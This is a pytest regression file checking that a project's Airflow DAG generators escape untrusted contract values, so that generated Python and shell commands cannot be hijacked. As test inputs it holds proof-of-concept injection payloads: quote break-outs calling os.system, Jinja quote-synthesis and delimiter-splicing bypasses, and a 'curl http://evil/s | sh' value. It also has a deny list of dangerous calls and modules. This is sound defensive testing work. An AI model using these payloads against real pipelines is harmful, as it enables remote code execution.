# Copyright 2024-2026 Agentics Transformation Ltd
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""Regression tests: untrusted contract values must not be able to inject code
into generated Airflow DAG Python files.

A generated DAG is *executed* by Airflow when it parses the file, so any
contract value that is interpolated into the generated source — a ``taskId``,
``sql``/``query``, ``bucket``, ``name``, ``timezone``, ``schedule``, a
``dependsOn`` edge — must be emitted as an escaped Python literal
(``py_str_literal``) or a sanitised identifier (``sanitize_identifier``), never
wrapped in hand-written quotes.

These tests are mechanism-agnostic: rather than asserting a particular escaping
they parse the generated source and assert (1) it is syntactically valid and
(2) the AST contains no executable call to ``os.system``/``exec``/``eval``/
``__import__`` and no import of ``os``/``subprocess`` — i.e. the payload, if
present, survives only as inert string data.
"""

from __future__ import annotations

import ast
import shlex

import pytest

# The exact PoC payload from the vulnerability report: a triple-quote that
# would close a ``sql=\"\"\"...\"\"\"`` literal, then a top-level os.system call.
POC_SQL = 'SELECT 1"""\nimport os; os.system("touch /tmp/PWNED")\nx="""'
# Single-quote break-out + newline + statement.
POC_SQUOTE = "x'; import os; os.system('touch /tmp/PWNED2')\ny='"
# A taskId / identifier carrying a newline + statement (LHS / dependency vector).
POC_IDENT = "t_evil\nimport os; os.system('touch /tmp/PWNED3')\nx = "

_DANGEROUS_CALLS = {"system", "popen", "exec", "eval", "__import__", "spawn", "Popen"}
_DANGEROUS_MODULES = {"os", "subprocess", "sys", "shutil", "socket"}


def assert_inert(code: str) -> ast.Module:
    """Assert ``code`` parses and contains no injected executable construct."""
    tree = ast.parse(code)  # raises SyntaxError if a payload broke out
    offenders = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            name = getattr(node.func, "id", None) or getattr(node.func, "attr", None)
            if name in _DANGEROUS_CALLS:
                offenders.append(f"call:{name}")
        if isinstance(node, ast.Import):
            offenders.extend(
                f"import:{a.name}" for a in node.names if a.name.split(".")[0] in _DANGEROUS_MODULES
            )
        if (
            isinstance(node, ast.ImportFrom)
            and (node.module or "").split(".")[0] in _DANGEROUS_MODULES
        ):
            offenders.append(f"from:{node.module}")
    assert not offenders, f"code injection: generated DAG executes {offenders}\n---\n{code}"
    return tree


# ---------------------------------------------------------------------------
# Primitives
# ---------------------------------------------------------------------------


def test_py_str_literal_neutralises_breakouts():
    from fluid_build.providers.common.codegen_utils import py_str_literal

    for payload in (POC_SQL, POC_SQUOTE, "a'b", 'a"b', "a\nb", "a\\b", '"""', "''''"):
        literal = py_str_literal(payload)
        # The literal must eval back to exactly the original (round-trip) and be
        # a single expression — proving it cannot contain an executable stmt.
        assert ast.literal_eval(literal) == payload
    # None / non-str are coerced, never emitted as a raw object repr.
    assert py_str_literal(None) == "''"
    assert ast.literal_eval(py_str_literal(123)) == "123"


def test_escape_for_docstring_cannot_close_docstring():
    from fluid_build.providers.common.codegen_utils import escape_for_docstring

    escaped = escape_for_docstring('x"""\nimport os; os.system("p")\ny')
    wrapped = '"""\n' + escaped + '\n"""'
    assert_inert(wrapped)


def test_sanitize_identifier_is_always_a_legal_name():
    from fluid_build.providers.common.codegen_utils import sanitize_identifier

    for payload in (POC_IDENT, "a-b", "a.b", "a b", "1abc", "", "../../x", "a';b"):
        assert sanitize_identifier(payload).isidentifier()


# ---------------------------------------------------------------------------
# Main provider-aware scheduler (fluid_build/schedulers/airflow)
# ---------------------------------------------------------------------------


def _malicious_contract(action_prefix: str, params_key: str) -> dict:
    return {
        "id": POC_SQUOTE,
        "name": POC_SQL,
        "orchestration": {
            "schedule": "0 2 * * *",
            "timezone": POC_SQUOTE,
            "tasks": [
                {
                    "taskId": POC_IDENT,
                    "type": "provider_action",
                    "action": f"{action_prefix}.query",
                    "params": {params_key: POC_SQL, "bucket": POC_SQL, "query": POC_SQL},
                },
                {
                    "taskId": "t2",
                    "type": "provider_action",
                    "action": f"{action_prefix}.query",
                    "params": {params_key: "SELECT 2"},
                    "dependsOn": [POC_IDENT],
                },
            ],
        },
    }


@pytest.mark.parametrize(
    "provider,prefix",
    [("snowflake", "sf.snowflake"), ("gcp", "gcp.bigquery"), ("aws", "aws.athena")],
)
def test_main_scheduler_provider_tasks_are_injection_safe(provider, prefix):
    from fluid_build.schedulers.airflow import AirflowScheduler

    contract = _malicious_contract(prefix, "sql")
    out = AirflowScheduler().generate(contract, provider=provider)
    (code,) = out.values()
    assert_inert(code)
    assert "touch /tmp/PWNED" in code  # payload preserved as inert data


def test_main_scheduler_exact_poc_defeated():
    """The exact report PoC: snowflake sql triple-quote break-out."""
    from fluid_build.schedulers.airflow import AirflowScheduler

    contract = {
        "id": "p",
        "name": "p",
        "orchestration": {
            "tasks": [
                {
                    "taskId": "t1",
                    "type": "provider_action",
                    "action": "sf.snowflake.query",
                    "params": {"sql": POC_SQL},
                }
            ]
        },
    }
    (code,) = AirflowScheduler().generate(contract, provider="snowflake").values()
    assert_inert(code)


# ---------------------------------------------------------------------------
# Provider-local generators
# ---------------------------------------------------------------------------


def test_gcp_codegen_is_injection_safe():
    from fluid_build.providers.gcp.codegen.airflow import generate_airflow_dag

    contract = {
        "id": POC_SQUOTE,
        "name": POC_SQL,
        "orchestration": {
            "timezone": POC_SQUOTE,
            "tasks": [
                {
                    "taskId": POC_IDENT,
                    "type": "provider_action",
                    "action": "gcp.bigquery.query",
                    "params": {"query": POC_SQL},
                },
                {
                    "taskId": "t_gcs",
                    "type": "provider_action",
                    "action": "gcp.gcs.create_bucket",
                    "params": {"bucket": POC_SQL},
                    "dependsOn": [POC_IDENT],
                },
                {
                    "taskId": "t_flow",
                    "type": "provider_action",
                    "action": "gcp.dataflow.run_template",
                    "params": {"template": POC_SQL, "job_name": POC_SQL},
                },
                {
                    "taskId": "t_py",
                    "type": "provider_action",
                    "action": "gcp.unknown.thing",
                    "params": {"anything": POC_SQL},
                },
            ],
        },
    }
    assert_inert(generate_airflow_dag(contract, "my-project", "us-central1"))


def test_snowflake_codegen_is_injection_safe():
    from fluid_build.providers.snowflake.codegen.airflow import generate_airflow_dag

    contract = {
        "id": POC_SQUOTE,
        "name": POC_SQL,
        "orchestration": {
            "timezone": POC_SQUOTE,
            "tasks": [
                {
                    "taskId": POC_IDENT,
                    "type": "provider_action",
                    "action": "sf.snowflake.query",
                    "params": {"sql": POC_SQL, "warehouse": POC_SQL, "database": POC_SQL},
                },
                {
                    "taskId": "t2",
                    "type": "provider_action",
                    "action": "sf.snowflake.query",
                    "params": {"sql": "SELECT 2"},
                    "dependsOn": [POC_IDENT],
                },
            ],
        },
    }
    assert_inert(generate_airflow_dag(contract, account=POC_SQUOTE, database=POC_SQL))


# ---------------------------------------------------------------------------
# Shared header builder
# ---------------------------------------------------------------------------


def test_generate_file_header_docstring_is_injection_safe():
    from fluid_build.providers.common.codegen_utils import generate_file_header

    header = generate_file_header(
        contract_id='x"""\nimport os; os.system("p")\ny',
        contract_name='n"""\nexec("evil")\nz',
        provider="gcp",
        schedule=POC_SQL,
        timezone=POC_SQUOTE,
    )
    # Header is a bare docstring; wrap it in a module to parse.
    assert_inert(header + "\npass\n")


# ---------------------------------------------------------------------------
# Benign output is unchanged (no false-positive churn)
# ---------------------------------------------------------------------------


def test_benign_contract_still_produces_expected_operators():
    from fluid_build.schedulers.airflow import AirflowScheduler

    contract = {
        "id": "sales",
        "name": "Sales Pipeline",
        "orchestration": {
            "tasks": [
                {
                    "taskId": "load",
                    "type": "provider_action",
                    "action": "sf.snowflake.query",
                    "params": {"sql": "SELECT 1"},
                },
            ]
        },
    }
    (code,) = AirflowScheduler().generate(contract, provider="snowflake").values()
    assert_inert(code)
    assert "load = SnowflakeOperator(" in code
    assert "sql='SELECT 1'" in code
    assert "task_id='load'" in code


# ---------------------------------------------------------------------------
# AirflowDAGGenerator (runtimes/airflow_provider_actions.py)
#
# This generator builds a ``BashOperator`` per providerAction. Every task
# generator previously interpolated contract values straight into
# ``bash_command="{command}"`` inside an f-string, so a quote in any of them
# closed the Python literal and put the rest of the value at module scope --
# executed by Airflow at DAG-parse time. The ``builds[].script`` vector
# (``scheduleTask``) was the sharpest: it is passed through verbatim by design.
# ---------------------------------------------------------------------------


def _dag_from_actions(provider_actions):
    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator

    contract = {
        "id": "test.product.v1",
        "kind": "DataProduct",
        "fluidVersion": "0.7.5",
        "providerActions": provider_actions,
    }
    return AirflowDAGGenerator().generate_dag(contract)


@pytest.mark.parametrize(
    "action,params",
    [
        ("scheduleTask", {"engine": "dbt", "script": POC_SQUOTE, "buildId": "b1"}),
        ("scheduleTask", {"engine": "sql", "script": POC_SQL, "buildId": "b1"}),
        ("scheduleTask", {"engine": "spark", "script": POC_SQUOTE, "buildId": "b1"}),
        ("scheduleTask", {"engine": "dbt", "script": "", "buildId": POC_SQUOTE}),
        ("provisionDataset", {"exposeId": POC_SQUOTE}),
        ("grantAccess", {"principal": POC_SQUOTE, "role": "viewer", "exposeId": "e1"}),
        ("grantAccess", {"principal": "p", "role": POC_SQL, "exposeId": "e1"}),
        ("registerSchema", {"schemaName": POC_SQUOTE}),
        ("createView", {"viewName": POC_SQUOTE}),
        ("custom", {"customAction": POC_SQUOTE}),
    ],
)
def test_provider_action_dag_is_injection_safe(action, params):
    """Every params vector must survive only as inert string data."""
    assert_inert(_dag_from_actions([{"actionId": "a1", "action": action, "params": params}]))


def test_provision_task_gcp_location_is_injection_safe():
    """``binding.location.project``/``dataset`` reach the bq command line."""
    assert_inert(
        _dag_from_actions(
            [
                {
                    "actionId": "a1",
                    "action": "provisionDataset",
                    "provider": "gcp",
                    "params": {
                        "exposeId": "e1",
                        "binding": {"location": {"project": POC_SQUOTE, "dataset": POC_SQL}},
                    },
                }
            ]
        )
    )


def test_action_id_and_depends_on_are_sanitised_identifiers():
    """``actionId`` becomes a Python variable name on both the definition and
    the ``a >> b`` dependency wiring -- a newline there is a statement."""
    assert_inert(
        _dag_from_actions(
            [
                {"actionId": POC_IDENT, "action": "registerSchema", "params": {"schemaName": "s"}},
                {
                    "actionId": "a2",
                    "action": "createView",
                    "params": {"viewName": "v"},
                    "dependsOn": [POC_IDENT],
                },
            ]
        )
    )


def test_description_comment_cannot_escape_into_code():
    """``description`` renders into a ``#`` comment, which a newline ends."""
    assert_inert(
        _dag_from_actions(
            [
                {
                    "actionId": "a1",
                    "action": "custom",
                    "description": "do a thing\nimport os; os.system('touch /tmp/PWNED4')",
                    "params": {},
                }
            ]
        )
    )


def test_schedule_task_emits_select_not_models():
    """``--models`` warns on dbt-core 1.10 and is a hard error on dbt v2."""
    code = _dag_from_actions(
        [
            {
                "actionId": "a1",
                "action": "scheduleTask",
                "params": {"engine": "dbt", "script": "my_model", "buildId": "b1"},
            }
        ]
    )
    assert "--select" in code
    assert "--models" not in code


def test_benign_provider_action_dag_still_renders_operators():
    """The escaping must not break the happy path."""
    code = _dag_from_actions(
        [
            {
                "actionId": "build-orders",
                "action": "scheduleTask",
                "params": {"engine": "dbt", "script": "orders", "buildId": "b1"},
            }
        ]
    )
    tree = assert_inert(code)
    assert "BashOperator" in code
    assert "build_orders = BashOperator" in code
    assert isinstance(tree, ast.Module)


# ---------------------------------------------------------------------------
# The DAG *header* is a second surface: dag_id, description, schedule, kind and
# domain are all contract-derived and land in `DAG(...)` kwargs and a
# triple-quoted docstring.
# ---------------------------------------------------------------------------


def _dag_from_contract(**contract_overrides):
    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator

    contract = {
        "id": "test.product.v1",
        "kind": "DataProduct",
        "fluidVersion": "0.7.5",
        "providerActions": [
            {"actionId": "a1", "action": "registerSchema", "params": {"schemaName": "s"}}
        ],
    }
    contract.update(contract_overrides)
    return AirflowDAGGenerator().generate_dag(contract)


@pytest.mark.parametrize(
    "overrides",
    [
        {"id": POC_SQUOTE},
        {"description": POC_SQL},
        {"description": POC_SQUOTE},
        {"orchestration": {"schedule": POC_SQUOTE}},
        {"kind": POC_SQUOTE},
        {"domain": POC_SQUOTE},
        {"name": POC_SQL},
    ],
)
def test_dag_header_is_injection_safe(overrides):
    assert_inert(_dag_from_contract(**overrides))


def test_empty_dag_header_is_injection_safe():
    """The no-actions placeholder DAG renders dag_id/schedule too."""
    from fluid_build.runtimes.airflow_provider_actions import AirflowDAGGenerator

    code = AirflowDAGGenerator().generate_dag(
        {"id": POC_SQUOTE, "kind": "DataProduct", "fluidVersion": "0.7.5"}
    )
    assert_inert(code)


def test_schedule_task_script_is_shell_quoted_not_just_python_inert():
    """`assert_inert` only proves the value cannot escape the *Python* literal.

    The shell layer is separate: the string inside `bash_command` is handed to
    a shell at task runtime, so a `;` in `script` must not start a new command.
    """
    import ast

    code = _dag_from_actions(
        [
            {
                "actionId": "a1",
                "action": "scheduleTask",
                "params": {
                    "engine": "spark",
                    "script": "job.py; curl http://evil/s | sh",
                    "buildId": "b1",
                },
            }
        ]
    )
    tree = assert_inert(code)
    commands = [
        kw.value.value
        for node in ast.walk(tree)
        if isinstance(node, ast.Call)
        for kw in node.keywords
        if kw.arg == "bash_command" and isinstance(kw.value, ast.Constant)
    ]
    assert commands, "no bash_command found"
    # shlex.quote wraps the whole value, so the `;` is inside quotes.
    assert commands[0] == "'job.py; curl http://evil/s | sh'", commands[0]


# ---------------------------------------------------------------------------
# The RUNTIME layer. `bash_command` is an Airflow `template_field`, so Airflow
# re-renders it as Jinja at TASK runtime -- after generation-time quoting is
# baked in. `shlex.quote` does nothing to `{{ ... }}`, and Jinja string escapes
# can synthesise a quote from a payload containing none, escaping the quoting.
# `assert_inert` cannot see this: it only parses the generated Python.
# ---------------------------------------------------------------------------

#: Renders to a bare `'` without containing one, so shlex.quote has nothing
#: to escape. This is the payload that defeats quoting-only defences.
POC_JINJA_QUOTE = '{{ "\\x27" }}; touch /tmp/FLUID_PWNED; #'

#: Same attack, but the delimiters are SPLICED: a single non-overlapping
#: `re.sub` pass that removes two-character Jinja delimiters rejoins the
#: survivors into new ones -- `{}}{` -> `{{` and `}{{}` -> `}}` -- so the
#: payload arrives at the shell with live Jinja. This defeats a
#: delimiter-matching strip; only stripping braces themselves survives it.
POC_JINJA_SPLICED = '{}}{ "\\x27" }{{}; touch /tmp/FLUID_PWNED; #'


def _bash_commands(code):
    """Every `bash_command=` value in the generated DAG, as Python sees it."""
    return [
        kw.value.value
        for node in ast.walk(ast.parse(code))
        if isinstance(node, ast.Call)
        for kw in node.keywords
        if kw.arg == "bash_command" and isinstance(kw.value, ast.Constant)
    ]


def _render_like_airflow(command: str) -> str:
    """Render as Airflow does, with a hostile DAG object in context."""
    sandbox = pytest.importorskip("jinja2.sandbox")

    class _Dag:
        description = "'; touch /tmp/FLUID_PWNED_VIA_DAG; #"
        dag_id = "d"

    class _Var:
        """Stands in for Airflow's `var.value.<key>` accessor."""

        value = type("V", (), {"__getattr__": lambda self, k: "resolved-" + k})()

    env = sandbox.SandboxedEnvironment()
    return env.from_string(command).render(dag=_Dag(), var=_Var())


@pytest.mark.parametrize(
    "params",
    [
        {"exposeId": POC_JINJA_QUOTE},
        {"exposeId": "e", "binding": {"location": {"project": POC_JINJA_QUOTE, "dataset": "d"}}},
        {"exposeId": "e", "binding": {"location": {"project": "p", "dataset": POC_JINJA_QUOTE}}},
        {"exposeId": "{{ dag.description }}"},
        # Spliced variants -- these pass against a brace strip and FAIL
        # against a delimiter-matching strip.
        {"exposeId": POC_JINJA_SPLICED},
        {"exposeId": "e", "binding": {"location": {"project": POC_JINJA_SPLICED, "dataset": "d"}}},
        {"exposeId": "e", "binding": {"location": {"project": "p", "dataset": POC_JINJA_SPLICED}}},
    ],
)
def test_contract_value_cannot_inject_via_runtime_jinja_render(params):
    """After Airflow's render, the shell must still see one inert token."""
    code = _dag_from_actions(
        [{"actionId": "a1", "action": "provisionDataset", "provider": "gcp", "params": params}]
    )
    for command in _bash_commands(code):
        rendered = _render_like_airflow(command)
        # The payload must not have escaped into a second shell command.
        assert "touch /tmp/FLUID_PWNED" not in shlex.split(rendered), rendered
        for token in shlex.split(rendered):
            assert not token.startswith("touch"), f"escaped the quoting: {rendered}"


def test_schedule_task_script_cannot_inject_via_runtime_jinja_render():
    code = _dag_from_actions(
        [
            {
                "actionId": "a1",
                "action": "scheduleTask",
                "params": {"engine": "dbt", "script": POC_JINJA_QUOTE, "buildId": "b1"},
            }
        ]
    )
    for command in _bash_commands(code):
        rendered = _render_like_airflow(command)
        assert shlex.split(rendered)[:3] == ["dbt", "run", "--select"], rendered
        assert len(shlex.split(rendered)) == 4, f"escaped the quoting: {rendered}"


def test_generator_authored_jinja_defaults_still_render():
    """The fix must not break the generator's own `{{ var.value.* }}`."""
    code = _dag_from_actions(
        [{"actionId": "a1", "action": "provisionDataset", "provider": "gcp", "params": {}}]
    )
    assert any("var.value.gcp_project" in c for c in _bash_commands(code))


@pytest.mark.parametrize("payload", [POC_JINJA_QUOTE, POC_JINJA_SPLICED])
@pytest.mark.parametrize(
    "action,params_key",
    [
        ("registerSchema", "schemaName"),
        ("createView", "viewName"),
        ("grantAccess", "principal"),
        ("grantAccess", "role"),
        ("scheduleTask", "buildId"),
        ("scheduleTask", "script"),
    ],
)
def test_every_bash_command_site_resists_runtime_jinja(action, params_key, payload):
    """Every command-building branch, both payload shapes.

    `scheduleTask`+`buildId` covers the else-branch that once used bare
    `shlex.quote` instead of `_sh`; the spliced payload covers the
    delimiter-rejoin bypass.
    """
    params = {"engine": "python", params_key: payload}
    code = _dag_from_actions([{"actionId": "a1", "action": action, "params": params}])
    for command in _bash_commands(code):
        rendered = _render_like_airflow(command)
        for token in shlex.split(rendered):
            assert not token.startswith("touch"), f"escaped the quoting: {rendered}"


# ---------------------------------------------------------------------------
# sanitize_identifier is not injective: `a-b` and `a.b` both become `a_b`.
# codegen_utils documents that as safe because an upstream duplicate-taskId
# validator rejects duplicate raw ids -- but that validator
# (validate_contract_for_export) runs only in the Snowflake and GCP providers,
# never on this path. The result was two assignments to the same variable:
# the second overwrote the first and one declared task vanished from the DAG.
# ---------------------------------------------------------------------------


def _assigned_task_names(code):
    return [
        t.id
        for node in ast.walk(ast.parse(code))
        for t in getattr(node, "targets", [])
        if isinstance(node, ast.Assign) and isinstance(t, ast.Name)
    ]


@pytest.mark.parametrize(
    "first,second",
    [
        ("load-orders", "load.orders"),  # punctuation only
        ("a b", "a_b"),  # space vs underscore
        ("x.y.z", "x-y-z"),
    ],
)
def test_colliding_action_ids_still_emit_two_tasks(first, second):
    code = _dag_from_actions(
        [
            {"actionId": first, "action": "registerSchema", "params": {"schemaName": "a"}},
            {"actionId": second, "action": "createView", "params": {"viewName": "b"}},
        ]
    )
    assert_inert(code)
    names = [n for n in _assigned_task_names(code) if n not in ("dag", "default_args")]
    assert len(names) == 2, f"a task was dropped: {names}"
    assert len(set(names)) == 2, f"two tasks share one variable: {names}"


def test_dependency_wiring_follows_the_disambiguated_names():
    """Each edge must point at its own task, not all at the survivor."""
    code = _dag_from_actions(
        [
            {"actionId": "load-orders", "action": "registerSchema", "params": {"schemaName": "a"}},
            {"actionId": "load.orders", "action": "createView", "params": {"viewName": "b"}},
            {
                "actionId": "final",
                "action": "registerSchema",
                "params": {"schemaName": "c"},
                "dependsOn": ["load-orders", "load.orders"],
            },
        ]
    )
    assert_inert(code)
    edges = {line.strip() for line in code.splitlines() if ">>" in line}
    assert len(edges) == 2, f"edges collapsed onto one task: {edges}"


def test_benign_ids_are_unchanged():
    """Disambiguation must not rename anything that did not collide."""
    code = _dag_from_actions(
        [
            {"actionId": "build-orders", "action": "registerSchema", "params": {"schemaName": "a"}},
            {"actionId": "grant-analysts", "action": "createView", "params": {"viewName": "b"}},
        ]
    )
    names = set(_assigned_task_names(code))
    assert {"build_orders", "grant_analysts"} <= names
    assert not any(n.endswith("_2") for n in names)


# ---------------------------------------------------------------------------
# AWS provider-local generator
#
# The AWS generator was the only one of the four Airflow emitters that never
# imported ``codegen_utils``; it hand-quoted every value as ``'{value}'``. The
# cases below pin both halves of the fix: the payload must stay inert, and the
# emitted DAG must not reference a name it never defines (Airflow executes the
# module at parse time, so a ``NameError`` breaks the DAG just as surely).
# ---------------------------------------------------------------------------

_PY_BUILTINS = set(dir(__builtins__)) | set(vars(__import__("builtins")))


def _bound_names(tree: ast.Module) -> set:
    """Every name the generated module binds at any scope."""
    bound = set()
    for node in ast.walk(tree):
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            bound.update((a.asname or a.name).split(".")[0] for a in node.names)
        elif isinstance(node, ast.Name) and isinstance(node.ctx, (ast.Store, ast.Del)):
            bound.add(node.id)
        elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)):
            bound.add(node.name)
            args = getattr(node, "args", None)
            if args is not None:
                bound.update(
                    a.arg
                    for a in [*args.posonlyargs, *args.args, *args.kwonlyargs]
                    + [args.vararg, args.kwarg]
                    if a is not None
                )
        elif isinstance(node, ast.Lambda):
            a = node.args
            bound.update(
                x.arg
                for x in [*a.posonlyargs, *a.args, *a.kwonlyargs] + [a.vararg, a.kwarg]
                if x is not None
            )
        elif isinstance(node, ast.ExceptHandler) and node.name:
            bound.add(node.name)
    return bound


def assert_no_undefined_names(code: str) -> None:
    """Assert the generated module never loads a name it does not define.

    Catches the whole class of "generated DAG explodes at Airflow parse time":
    a missing ``from zoneinfo import ZoneInfo``, a helper function the emitter
    calls but never emits, and raw JSON spliced in as a Python expression
    (``true``/``false``/``null`` are not Python names).
    """
    tree = ast.parse(code)
    bound = _bound_names(tree) | _PY_BUILTINS
    undefined = sorted(
        {
            n.id
            for n in ast.walk(tree)
            if isinstance(n, ast.Name) and isinstance(n.ctx, ast.Load) and n.id not in bound
        }
    )
    assert not undefined, f"generated DAG references undefined names {undefined}\n---\n{code}"


def _aws_contract(**orchestration):
    base = {
        "timezone": POC_SQUOTE,
        "schedule": POC_SQUOTE,
        "tasks": [
            {
                "taskId": POC_IDENT,
                "type": "provider_action",
                "action": "aws.athena.execute_query",
                "params": {
                    "query": POC_SQL,
                    "database": POC_SQUOTE,
                    "outputLocation": POC_SQL,
                },
            },
            {
                "taskId": "t_s3",
                "type": "provider_action",
                "action": "aws.s3.ensure_bucket",
                "params": {"bucket": POC_SQL, "region": POC_SQUOTE},
                "dependsOn": [POC_IDENT],
            },
            {
                "taskId": "t_glue_db",
                "type": "provider_action",
                "action": "aws.glue.ensure_database",
                "params": {"database": POC_SQL},
            },
            {
                "taskId": "t_glue_tbl",
                "type": "provider_action",
                "action": "aws.glue.ensure_table",
                "params": {
                    "database": POC_SQL,
                    "table": POC_SQUOTE,
                    # a bool proves raw json.dumps splicing is gone: Python has
                    # no bare ``true``
                    "partitioned": True,
                },
            },
            {
                "taskId": "t_redshift",
                "type": "provider_action",
                "action": "aws.redshift.execute_statement",
                "params": {"sql": POC_SQL, "clusterIdentifier": POC_SQUOTE},
            },
            {
                "taskId": "t_lambda",
                "type": "provider_action",
                "action": "aws.lambda.invoke",
                "params": {"functionName": POC_SQL, "payload": {"k": POC_SQL, "flag": False}},
            },
            {
                "taskId": "t_fallback",
                "type": "provider_action",
                "action": "aws.unknown.thing",
                "params": {"anything": POC_SQL, "nested": {"deep": True}},
            },
        ],
    }
    base.update(orchestration)
    return {"id": POC_SQUOTE, "name": POC_SQL, "orchestration": base}


def test_aws_codegen_is_injection_safe():
    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag

    assert_inert(generate_airflow_dag(_aws_contract(), "123456789012", "eu-west-1"))


def test_aws_taskflow_codegen_is_injection_safe():
    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag_taskflow

    assert_inert(generate_airflow_dag_taskflow(_aws_contract(), "123456789012", "eu-west-1"))


def test_aws_codegen_emits_no_undefined_names():
    """Classic path: ZoneInfo, the glue/provider helpers, and JSON booleans."""
    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag

    assert_no_undefined_names(generate_airflow_dag(_aws_contract(), "123456789012", "eu-west-1"))


def test_aws_taskflow_emits_no_undefined_names():
    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag_taskflow

    assert_no_undefined_names(
        generate_airflow_dag_taskflow(_aws_contract(), "123456789012", "eu-west-1")
    )


def test_aws_benign_sql_with_apostrophe_still_parses():
    """The bug users hit first: a perfectly ordinary quoted SQL literal.

    ``WHERE c = 'a'`` closed the hand-written ``query='...'`` and produced a
    DAG that would not parse — no attacker required.
    """
    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag

    contract = {
        "id": "demo_product",
        "name": "Demo",
        "orchestration": {
            "schedule": "0 2 * * *",
            "timezone": "UTC",
            "tasks": [
                {
                    "taskId": "q1",
                    "type": "provider_action",
                    "action": "aws.athena.execute_query",
                    "params": {
                        "query": "SELECT * FROM t WHERE c = 'a'",
                        "database": "db",
                        "outputLocation": "s3://b/o/",
                    },
                }
            ],
        },
    }
    code = generate_airflow_dag(contract, "123456789012", "eu-west-1")
    tree = ast.parse(code)
    # the SQL survives intact as inert data, quote and all
    literals = {
        n.value for n in ast.walk(tree) if isinstance(n, ast.Constant) and isinstance(n.value, str)
    }
    assert "SELECT * FROM t WHERE c = 'a'" in literals


def test_aws_round_trips_payload_as_inert_data():
    """Escaping, not stripping: the payload must still be readable as data."""
    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag

    code = generate_airflow_dag(_aws_contract(), "123456789012", "eu-west-1")
    tree = ast.parse(code)
    literals = {
        n.value for n in ast.walk(tree) if isinstance(n, ast.Constant) and isinstance(n.value, str)
    }
    assert POC_SQL in literals, "query payload was mangled rather than escaped"


def test_aws_task_id_collisions_do_not_merge_tasks():
    """``load-orders`` and ``load.orders`` must stay two distinct variables."""
    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag

    contract = {
        "id": "c",
        "name": "c",
        "orchestration": {
            "tasks": [
                {
                    "taskId": "load-orders",
                    "type": "provider_action",
                    "action": "aws.s3.ensure_bucket",
                    "params": {"bucket": "a"},
                },
                {
                    "taskId": "load.orders",
                    "type": "provider_action",
                    "action": "aws.s3.ensure_bucket",
                    "params": {"bucket": "b"},
                },
            ]
        },
    }
    code = generate_airflow_dag(contract, "123456789012", "eu-west-1")
    tree = assert_inert(code)
    # Only module-level assignments: the emitted helper functions legitimately
    # reuse local names such as ``client`` across their separate bodies.
    assigned = [
        t.id
        for n in tree.body
        if isinstance(n, ast.Assign)
        for t in n.targets
        if isinstance(t, ast.Name)
    ]
    operator_vars = [n for n in assigned if n not in {"default_args", "dag", "logger"}]
    assert len(set(operator_vars)) == len(operator_vars), f"task vars collided: {operator_vars}"
    assert len(operator_vars) == 2, f"expected both tasks emitted, got {operator_vars}"


def test_aws_dep_on_non_dag_task_is_skipped_not_synthesised():
    """A dependsOn naming a filtered-out task must not invent a variable.

    Only ``provider_action`` tasks reach the DAG. Synthesising a name for any
    other dep either emitted an undefined name (``NameError`` at import kills
    every task in the file) or, because ``sanitize_identifier`` is not
    injective, silently wired the edge to a *different* real task.
    """
    from fluid_build.providers.aws.codegen.airflow import generate_airflow_dag

    contract = {
        "id": "c",
        "name": "c",
        "orchestration": {
            "tasks": [
                {"taskId": "prep", "type": "python", "action": "noop", "params": {}},
                {
                    "taskId": "make_bucket",
                    "type": "provider_action",
                    "action": "aws.s3.ensure_bucket",
                    "params": {"bucket": "b"},
                    "dependsOn": ["prep"],
                },
            ]
        },
    }
    code = generate_airflow_dag(contract, "123456789012", "eu-west-1")
    assert_no_undefined_names(code)
    assert "prep >>" not in code
    assert "skipped" in code


def test_aws_task_id_cannot_rebind_emitted_module_names():
    """A taskId of ``dag`` must not overwrite the DAG object itself."""
    from fluid_build.providers.aws.codegen.airflow import _unique_task_identifiers

    m = _unique_task_identifiers([{"taskId": "dag"}, {"taskId": "_execute_provider_action"}])
    assert m["dag"] != "dag"
    assert m["_execute_provider_action"] != "_execute_provider_action"
